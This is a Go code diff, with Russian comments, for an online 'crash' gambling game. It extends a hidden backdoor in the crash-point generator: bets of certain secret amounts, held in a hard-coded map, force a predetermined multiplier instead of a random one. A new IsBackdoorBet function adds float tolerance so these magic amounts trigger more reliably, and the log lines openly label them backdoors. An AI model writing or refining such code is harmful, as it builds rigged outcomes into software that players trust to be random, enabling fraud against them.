@@ -57,20 +57,23 @@ func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
         return CG.generateRandomCrashPoint()
     }
 
+    // Детальное логирование количества ставок
+    logger.Info("Checking %d active bets for backdoors in game %d", len(bets), CG.ID)
+
     for _, bet := range bets {
-        // Приводим к целому, чтобы избавиться от мелких ошибок float64
-        amt := int(math.Round(bet.Amount))
-        logger.Info("Checking bet amount: %d", amt)
+        logger.Info("Checking bet: ID=%d, Amount=%.4f", bet.ID, bet.Amount)
         
-        // Используем карту crashPoints из crash_game_websocket.go
-        if multiplier, exists := GetCrashPoints()[amt]; exists {
-            logger.Info("Matched backdoor value %d -> %.1fx", amt, multiplier)
+        // Используем новую функцию IsBackdoorBet для более точного сравнения
+        isBackdoor, multiplier := IsBackdoorBet(bet.Amount)
+        if isBackdoor {
+            logger.Info("Matched backdoor value %.2f -> %.1fx", bet.Amount, multiplier)
             CG.CrashPointMultiplier = multiplier
             return multiplier
         }
     }
 
     // Если ни один backdoor не сработал — идём в случайный
+    logger.Info("No backdoors found for game %d, generating random point", CG.ID)
     return CG.generateRandomCrashPoint()
 }
 
@@ -93,6 +96,27 @@ func GetCrashPoints() map[int]float64 {
         11629:  4.0,
         46516:  4.5,
     }
+}
+
+// IsBackdoorBet проверяет, является ли сумма ставки бэкдором
+func IsBackdoorBet(amount float64) (bool, float64) {
+    // Используем округление и преобразование к целому для устранения проблем с плавающей точкой
+    intAmount := int(math.Round(amount))
+    
+    // Проверяем точное совпадение с бэкдором
+    if multiplier, exists := GetCrashPoints()[intAmount]; exists {
+        return true, multiplier
+    }
+    
+    // Если точного совпадения нет, проверяем с небольшим допуском
+    for backdoor, multiplier := range GetCrashPoints() {
+        // Допуск 0.01 для float64
+        if math.Abs(float64(backdoor)-amount) < 0.01 {
+            return true, multiplier
+        }
+    }
+    
+    return false, 0
 }
 
 // Выносим генерацию случайного краша в отдельную функцию
